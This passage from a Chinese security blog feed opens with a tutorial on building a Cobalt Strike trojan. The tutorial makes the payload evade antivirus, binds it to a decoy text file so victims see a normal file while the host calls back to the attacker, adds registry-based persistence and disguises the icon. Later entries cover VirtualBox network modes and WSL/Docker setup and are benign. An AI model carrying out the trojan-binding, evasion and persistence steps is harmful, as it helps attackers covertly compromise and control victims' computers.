    <content type="html"><![CDATA[<h1 id="免杀木马-文件捆绑-权限伪装"><a href="#免杀木马-文件捆绑-权限伪装" class="headerlink" title="免杀木马+文件捆绑+权限伪装"></a>免杀木马+文件捆绑+权限伪装</h1><ul><li><p><strong>文章前言</strong></p><p>通过学习使用Cobalt Strike来制作木马，使用摧日对其进行免杀覆盖，使用GoFilebinder对其进行免杀捆绑，最后利用Restorator对其进行图标修改。</p></li><li><p><strong>环境和软件准备</strong></p><p>\1. 一台windows系统的电脑作为攻击机</p><p>2.一台靶机</p><p>3.Cobalt Strike</p><p>4.摧日</p><p>5.GoFilebinder</p><p>6.Restorator</p></li><li><p><strong>工具介绍</strong></p><p>摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马主要支持C语言的shellcode和纯十六进制的shellcode<br>GoFileBinder：golang免杀捆绑器<br>Restorator：一款修改exe执行程序图标的小工具</p></li><li><p><strong>正文开始</strong></p><p>选用cs中的c格式shellcode，用cs生成一个c语言的相关东西，同时勾选上x64</p></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGTurmQDUUoIkwBgIUztkiayF20PQOFDEGIDPwCsExIlZMoXWZtqhbHUQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPsqAbCOyCY0LR1zGsKphmjGtM7UdiarEu9KtVXqAiaJqUXDe5fkibo8HQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>完成以上步骤后，接下来便开始对其进行免杀操作，用到的工具摧日对其进行免杀处理</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGWGKt2ibzRFhNE3XWAQ4SNIDDgcx9iasydQDQ76s0lDdwIoL6lz3QSJnQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>使用前请先获取相关工具，并确保已经安装工具所需要的的go环境，至于go环境安装请各位自行查阅本文不在做出相关介绍，安装完毕后进行下一步操作。复制上一步中生成的c文件的中的相关字符，将其另存为一个新的文档，并将该文档与摧日工具的exe文件放在一个目录之中，并运行工具，运行成功后将会得到免杀后的文件hoshino.exe。用相关管家进行查杀后，都可以正常通过。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGe2AiaWzWQRTVAaDMS4PdZJB2OwscrU2Od3UElHEbaB4alWSVxILs1ww/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGLFv5IbhM97F127XqH2teAoYrFOK0Aia24fdlAPrVrl1fdd364prbZ6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>  然后进行的操作是将这个马和正常的东西捆绑在一起，这个东西可以是可执行文件exe，也可以是文本txt，也可以是文档doc，任何你想的东西都可以进行捆绑。<br>   最后实现的效果是：目标用户点击你发送的恶意文件之后会在你的CS客户端上上线，而且目标用户打开的文件可以正常的使用，并且你的木马文件会自动迁移到C:\Users\Public<br>下面将木马和一个txt文本文件进行捆绑：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGR4x3GXibUMMPPmiaD0gDe0FXbg4KGzwKb8rMEI8y18Iga8ic9YcyqORXg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>将木马和txt文本文件还有GoFileBinder放在同级目录下，运行后得到如下结果，其中新出现的bilibili.exe就是我们要得到的文件</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGGRG2ibtmIjhvOkPhxzToHfPmVSH88PDGicKjLERicaxtQcsphHztxHg6g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>进行相关测试，将得到的文件双击后，该文件便会消失，在桌面上打开的便是我们所预设的ceshi.txt，并且我们的原文间将会自动一直到public目录下，cs也显示主机已经上线，至此所有工作已全部完成。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcG1F5yKYmDyIqj4H7s2ibdN7w5tPWFIm6hDrVsjlCyDSeWYx28IWgcI1w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/640" alt="图片"></p><p>最后一步，权限维持，如果不进行权限维持的话，目标用户在进行电脑重启后便会让改文件关闭，因此便需要用对其增加开机自启的相关操作，其后续路径因为程序会自动移动到public目录下便很好就能设置，</p><ul><li><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span> <span class="keyword">reg</span> <span class="built_in">add</span> HKLM\SOFTWARE\Microsoft\Windows\</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPjicPN7J7OvoS4UJvyzEkic3qlqUYl4Nby6ImRM2YopEtia00jpm7Zv3w/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>最后利用Restorator工具对该文件进行图标美化操作，可以将其伪装成一些较为常见的进程图标，该工具的使用较为方便，本文在这里便不再进行相关的阐述，请自行理解！</p>]]></content>
    
    
    <summary type="html">🥧免杀木马+文件捆绑+权限伪装</summary>
    
    
    
    <category term="web渗透" scheme="https://example.com/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://example.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机各种网络模式的区别</title>
    <link href="https://example.com/posts/1324d72d.html"/>
    <id>https://example.com/posts/1324d72d.html</id>
    <published>2024-12-01T15:19:46.607Z</published>
    <updated>2024-12-01T16:06:22.809Z</updated>
    
    <content type="html"><![CDATA[<p><strong>虚拟机各种网络模式的区别 NAT | NAT网络 | 桥接Bridged | 内部网络Internal | 仅主机(Host-Only)</strong></p><p><strong>模式一  NAT-网络地址转换</strong>：通过路由器的NAT功能给上网设备分配不同的私有地址，常见于大部分家庭网络，为VirtualBox的默认网络模式</p><p><strong>NAT工作流程</strong>：发送数据时NAT把私有地址转换为公有地址并可用端口进行标识，接收数据时NAT把公有地址转换为私有地址（私有地址有特定范围且不能被公有地址直接访问）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9a430a66a4ccaf9c01572bb2a9b1aac2c154de1d.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：VirtualBox虚拟出一台DHCP服务器并为虚拟机分配私有地址，虚拟机发出的数据在经过网关时通过里NAT改写数据包再通过宿主NAT转换发送到互联网，每个虚拟机都有同样的私有地址且虚拟机之间不可互通，虚拟机可访问宿主机但宿主机不可访问虚拟机（默认DHCP服务器和网关为10.0.2.2，私有地址为10.0.2.15）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/744b82bc579aff88c77261ebfbd77330a18e2d7f.png@1192w.webp" alt="img"></p><p><strong>模式二  NAT网络</strong>：与NAT的区别是通过在虚拟机上附加一台虚拟交换机实现虚拟机在NAT模式下互通</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/af61289e34d600c086ef7404cff0c39c03177140.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：VirtualBox虚拟出一台交换机附加在虚拟机上，虚拟机之间可互通，虚拟机可访问宿主机但宿主机不可访问虚拟机</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e0022982a39992eea61f462ed7483db965c95e83.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置NAT网络</strong>：</p><p>1.启用NAT网络：输入”名称”和”网络掩码”，勾选”启用DHCP”</p><p>2.配置网络模式：虚拟机找到设置-&gt;网络，”连接方式”选择”NAT网络”，”名称”选择上一步设置的网络名称（注意各虚拟机的MAC地址不应相同）</p><p><strong>模式三  桥接（桥接网卡）</strong>：虚拟机在宿主机所在的局域网中，通过宿主机使用的DHCP服务器获取IP地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd8f78aac71c26dfb19d2f7118c5a028cb1427c4.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：虚拟机通过宿主机使用的DHCP服务器获取IP地址，虚拟机间可互通，虚拟机和宿主机间可互通，互联网可访问虚拟机（需给虚拟机分配公网IP）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/23228e13557854d426fdb4174865be322f747a45.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置桥接模式</strong>：虚拟机找到设置-&gt;网络，”连接方式”选择”桥接网卡”，”名称”选择当前上网使用的网络连接（注意各虚拟机的MAC地址不应相同）</p><p><strong>模式四  内部网络</strong>：虚拟机和宿主机隔离，虚拟机使用内部的网络且无法访问外部网络和被外部网络访问</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/caef4843a152749cc368dc8153cb8d6a76217ce2.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：虚拟机间可互通，但虚拟机和宿主机/互联网无法互通，且VirtualBox默认不提供DHCP服务器需手动设置静态IP地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8478bde2fd377ab741f524b11fbd13f739c42007.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置内部网络</strong>：虚拟机找到设置-&gt;网络，”连接方式”选择”内部网络”，”名称”选择”internet”并手动给虚拟机配置IP地址</p><p><strong>模式五  仅主机</strong>：虚拟机和宿主机隔离，虚拟机使用提供宿主机提供的网络且无法访问外部网络和被外部网络访问</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1600825bab087d6274de6467c03dee5574e98984.png" alt="img"></p><p><strong>应用机制</strong>：虚拟机使用宿主机的虚拟DHCP服务器、虚拟网卡、虚拟交换机分配的IP地址，虚拟机间可互通，虚拟机和宿主机间可互通（虚拟机只能访问宿主机的虚拟网卡），虚拟机和互联网无法互通</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9b036d3be2d375a9a911faf4262b9506cff803f2.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置仅主机</strong>：</p><p>1.启用仅主机：输入”名称”、”掩码”、”最小地址”和”最大地址”</p><p>2.配置网络模式：虚拟机找到设置-&gt;网络，”连接方式”选择”仅主机”，”名称”选择上一步创建的网络名称</p>]]></content>
    
    
    <summary type="html">🥧虚拟机各种网络模式的区别 NAT | NAT网络 | 桥接Bridged | 内部网络Internal | 仅主机(Host-Only)</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>wsl配置ubuntu22.04，并配置docker</title>
    <link href="https://example.com/posts/ca6bf5ec.html"/>
    <id>https://example.com/posts/ca6bf5ec.html</id>
    <published>2024-12-01T15:19:41.334Z</published>
    <updated>2024-12-01T16:06:22.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="wsl配置ubuntu22-04，并配置docker"><a href="#wsl配置ubuntu22-04，并配置docker" class="headerlink" title="wsl配置ubuntu22.04，并配置docker"></a>wsl配置ubuntu22.04，并配置docker</h1><p>[TOC]</p><h2 id="一、在Windows上安装Linux子系统"><a href="#一、在Windows上安装Linux子系统" class="headerlink" title="一、在Windows上安装Linux子系统"></a>一、在Windows上安装Linux子系统</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol><li><p>windows机器需要支持虚拟化，并且需要在BIOS中开启虚拟化技术，因为WSL2基于hyper-V。<br><strong>查看是否开启虚拟化</strong><br>按住<code>Windows+R</code>输入<code>cmd</code>打开命令行，输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systeminfo</span></span><br></pre></td></tr></table></figure><p>可以看到如下字样，代表电脑已经支持虚拟化，可继续安装</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Hyper-V 要求</span><span class="punctuation">:</span> <span class="string">    虚拟机监视器模式扩展: 是</span></span><br><span class="line">                  <span class="attribute">固件中已启用虚拟化</span><span class="punctuation">:</span> <span class="string">是</span></span><br><span class="line">                  <span class="attribute">二级地址转换</span><span class="punctuation">:</span> <span class="string">是</span></span><br><span class="line">                  <span class="attribute">数据执行保护可用</span><span class="punctuation">:</span> <span class="string">是</span></span><br></pre></td></tr></table></figure></li><li><p>无论是Windows10还是Windows11，所使用的Windows是最新版的，如果不是最新版，请在<code>设置</code>-<code>Windows更新</code>中将系统更新到最新版本</p></li></ol><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ol><li><p>开启开发者模式</p></li><li><p>开启“适用于Linux的Windows子系统”：</p><p>找到 控制面板<code>-</code>程序和功能<code>-</code>启用或关闭Windows功能，选中“适用于Linux的Windows子系统”和“虚拟机平台”，然后点击确定。需要重启电脑。</p></li><li><p><a href="https://so.csdn.net/so/search?q=安装Linux&amp;spm=1001.2101.3001.7020">安装Linux</a>分发版：</p><ol><li><p>没有wsl的：下载Linux内核更新包，<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">适用于 x64 计算机的 WSL2 Linux 内核更新包</a>，安装。</p></li><li><p>有wsl的：直接终端输入</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="comment">--update</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>启用虚拟机功能</p><p>安装 WSL 2 之前，必须启用“虚拟机平台”可选功能。 计算机需要虚拟化功能才能使用此功能。<br>以管理员身份打开<code>PowerShell</code>并运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><p>这时需要重启电脑，等待电脑重新启动完成即可。</p></li><li><p>将 WSL 2 设置为默认版本</p><p>打开 <code>PowerShell</code>，然后在安装新的 Linux 发行版时运行以下命令，将 WSL 2 设置为默认版本：</p></li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --<span class="keyword">set</span>-<span class="keyword">default</span>-version <span class="number">2</span></span><br></pre></td></tr></table></figure><ol><li><p>安装ubuntu22.04版本 </p><p>直接在微软商店搜索ubuntu22.04，下载完成就行</p></li><li><p>运行</p><p>在开始菜单可以看到刚刚下载好的ubuntu22.04版本，直接双击运行，会提示输账户和密码，输入后就i能进去。（不输入就是默认root用户，需要自己添加账户）</p><p>此时可以在<code>此电脑</code>中看到<code>Linux</code>，打开它可以看到Ubuntu的文件，后续与Ubuntu之间的文件操作可以从此处进行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241114125151098.png" alt="image-20241114125151098"></p></li></ol><p>安装步骤就完成了。</p><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p>１. 创建用户目录<br>注意：登录到root用户．假如你之前没有设置过root用户，那么你就通过以下命令更改密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> passwd root</span><br></pre></td></tr></table></figure><p>然后登录root:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su root</span></span><br></pre></td></tr></table></figure><ol><li>创建新用户：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd -r -m -s /bin/bash username。 <span class="comment">#username改成你的用户名</span></span><br></pre></td></tr></table></figure><p>在 Ubuntu18.04 中，不会在创建用户的时候自动提示设置密码。需要手动执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> passwd username</span><br></pre></td></tr></table></figure><p>来设置新用户的密码。</p><p>其中参数的意义如下：<br>-r：建立系统账号<br>-m：自动建立用户的登入目录<br>-s：指定用户登入后所使用的shell</p><p>输入ls /home/，可以看到用户目录被成功创建了。</p><ol><li>修改用户权限(添加root权限）<br>这里采用修改/etc/sudoers文件的方法分配用户权限。因为此文件只有r权限，在改动前需要增加w权限，改动后，再去掉w权限。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +w /etc/sudoers</span><br><span class="line"><span class="built_in">sudo</span> vim /etc/sudoers</span><br><span class="line"></span><br><span class="line">添加下图的配置语句，并且保存修改</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -w /etc/sudoers</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c70b3418531a2b054405bca0d0fbf720.png" alt="在这里插入图片描述"></p><p>到此，新用户创建成功，并且用户目录被创建，权限也分配成功。</p><h2 id="二、wsl安装系统到其他盘"><a href="#二、wsl安装系统到其他盘" class="headerlink" title="二、wsl安装系统到其他盘"></a>二、wsl安装系统到其他盘</h2><p>因为默认是安装ubuntu在C盘，那我一般不喜欢在C盘装软件，所以把ubuntu该到了D盘。</p><h4 id="①查看wsl运行状态，将其保持在关闭状态"><a href="#①查看wsl运行状态，将其保持在关闭状态" class="headerlink" title="①查看wsl运行状态，将其保持在关闭状态"></a>①查看wsl运行状态，将其保持在关闭状态</h4><p>在powershell中输入代码：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl -l -v</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-7286f01d5c6deb9b.png" alt="img"></p><p>图中STATE显示Running，就需要使用</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="comment">--shutdown</span></span><br></pre></td></tr></table></figure><p>将其关闭，再次使用”wsl -l -v”确认状态</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-0af870c67ab12a06.png" alt="img"></p><p>发现已经不在运行了</p><h4 id="②导出当前Linux的镜像"><a href="#②导出当前Linux的镜像" class="headerlink" title="②导出当前Linux的镜像"></a>②导出当前Linux的镜像</h4><p>在D盘根目录创建了新文件夹“Ubuntu2204”作为之后ubuntu的安装位置</p><p>在Powershell中输入代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl</span> --export Ubuntu-<span class="number">22</span>.<span class="number">04</span> H:\ubuntu22.<span class="number">04</span>.tar </span><br></pre></td></tr></table></figure><p>其中，”Ubuntu-22.04”是使用”wsl -l -v”查看到的linux系统的名字和版本，“D:\ubuntu22.04.tar ”是在H盘的根目录下创建名为“ubuntu22.04.tar”的镜像</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-a7306ecc0d00b8be.png" alt="img"></p><h4 id="③注销之前的系统并检查"><a href="#③注销之前的系统并检查" class="headerlink" title="③注销之前的系统并检查"></a>③注销之前的系统并检查</h4><p>Powershell中输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl</span> --unregister Ubuntu-<span class="number">22</span>.<span class="number">04</span></span><br></pre></td></tr></table></figure><p>再通过“wsl -l -v”，发现子系统已删除</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-d2fb4376a29eb1df.png" alt="img"></p><h4 id="④导入镜像"><a href="#④导入镜像" class="headerlink" title="④导入镜像"></a>④导入镜像</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl</span> --import Ubuntu-<span class="number">22</span>.<span class="number">04</span> D:\Ubuntu2004 D:\ubuntu20.<span class="number">04</span>.tar </span><br></pre></td></tr></table></figure><p>Ubuntu-22.04    Linux系统名称和版本<br> D:\Ubuntu2204  安装路径<br> D:\ubuntu22.04.tar 镜像所在位置<br> 等待系统处理，在文件夹中看到vhdx文件即为导入成功</p><h4 id="⑤配置先前设置的默认登录用户"><a href="#⑤配置先前设置的默认登录用户" class="headerlink" title="⑤配置先前设置的默认登录用户"></a>⑤配置先前设置的默认登录用户</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu2204.exe config --default-<span class="keyword">user</span> <span class="title">username</span></span><br></pre></td></tr></table></figure><p>username替换成你先前输入的账户名，可以替换为root<br>至此ubuntu22.04迁移完成~！</p><h2 id="三、配置docker和docker-compose"><a href="#三、配置docker和docker-compose" class="headerlink" title="三、配置docker和docker-compose"></a>三、配置docker和docker-compose</h2><h3 id="Wsl2中的Ubuntu22-04安装Docker"><a href="#Wsl2中的Ubuntu22-04安装Docker" class="headerlink" title="Wsl2中的Ubuntu22.04安装Docker"></a>Wsl2中的Ubuntu22.04安装Docker</h3><blockquote><p>友情提示：确定为wsl2+ubuntu22.04，否则可能按照以下步骤会失败。若失败，请完全卸载后重装docker，并检查wsl版本</p></blockquote><p>安装依赖包</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sudo</span> apt install apt-trans<span class="keyword">port</span>-https ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源和密钥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/docker-ce/</span>linux<span class="regexp">/ubuntu/g</span>pg | sudo gpg --dearmor -o <span class="regexp">/usr/</span>share<span class="regexp">/keyrings/</span>docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源和密钥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/docker-ce/</span>linux<span class="regexp">/ubuntu/g</span>pg | sudo gpg --dearmor -o <span class="regexp">/usr/</span>share<span class="regexp">/keyrings/</span>docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure><p>从软件源中更新安装工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt uograde</span><br></pre></td></tr></table></figure><p>安装Docker套件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-<span class="keyword">ce</span> docker-<span class="keyword">ce</span>-cli containerd.io</span><br></pre></td></tr></table></figure><p>安装docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure><p>验证安装是否成功</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241114130614313.png" alt="image-20241114130614313"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service docker start</span><br></pre></td></tr></table></figure><h3 id="docker指令必须用sudo执行"><a href="#docker指令必须用sudo执行" class="headerlink" title="docker指令必须用sudo执行"></a>docker指令必须用sudo执行</h3><p>默认情况下， Unix 套接字 (Unix socket)由用户 root 拥有，其他用户只能使用 sudo 访问它。 Docker 守护进程始终以 root 用户身份运行。</p><p>为了避免每次都加sudo，需要给现在的账户添加docker权限</p><p>创建Docker用户组</p><p>通常在安装 Docker 时会自动创建一个名为 docker 的用户组，但可以手动确保其存在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> groupadd docker</span><br></pre></td></tr></table></figure><p>将当前用户添加到docker 组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><h3 id="配置Docker镜像源"><a href="#配置Docker镜像源" class="headerlink" title="配置Docker镜像源"></a>配置Docker镜像源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.创建Docker文件夹</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">2.写入个人镜像源</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://ud6340vz.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">3.重启守护进程和docker引擎</span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure><p>测试镜像源配置成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull hello-world</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/02162cf0dc8f48ad944b284e0c5cca0d.png" alt="img"></p><p>其他镜像源加速地址:</p><p>Docker 中国官方镜像    <a href="https://registry.docker-cn.com">https://registry.docker-cn.com</a><br>DaoCloud 镜像站    <a href="http://f1361db2.m.daocloud.io">http://f1361db2.m.daocloud.io</a><br>Azure 中国镜像    <a href="https://dockerhub.azk8s.cn">https://dockerhub.azk8s.cn</a><br>科大镜像站    <a href="https://docker.mirrors.ustc.edu.cn">https://docker.mirrors.ustc.edu.cn</a><br>阿里云    <a href="https://ud6340vz.mirror.aliyuncs.com">https://ud6340vz.mirror.aliyuncs.com</a><br>七牛云    <a href="https://reg-mirror.qiniu.com">https://reg-mirror.qiniu.com</a><br>网易云(常用)    <a href="https://hub-mirror.c.163.com">https://hub-mirror.c.163.com</a><br>腾讯云    <a href="https://mirror.ccs.tencentyun.com">https://mirror.ccs.tencentyun.com</a></p><h2 id="四、docker-pull-报错Get-“https-registry-1-docker-io-v2-“-net-http-request-canceled-while-waiting-for-connection-Client-Timeout-exceeded-while-awaiting-headers-解决方法"><a href="#四、docker-pull-报错Get-“https-registry-1-docker-io-v2-“-net-http-request-canceled-while-waiting-for-connection-Client-Timeout-exceeded-while-awaiting-headers-解决方法" class="headerlink" title="四、docker pull 报错Get “https://registry-1.docker.io/v2/“: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)解决方法"></a>四、docker pull 报错Get “<a href="https://registry-1.docker.io/v2/">https://registry-1.docker.io/v2/</a>“: net/http: request canceled while waiting 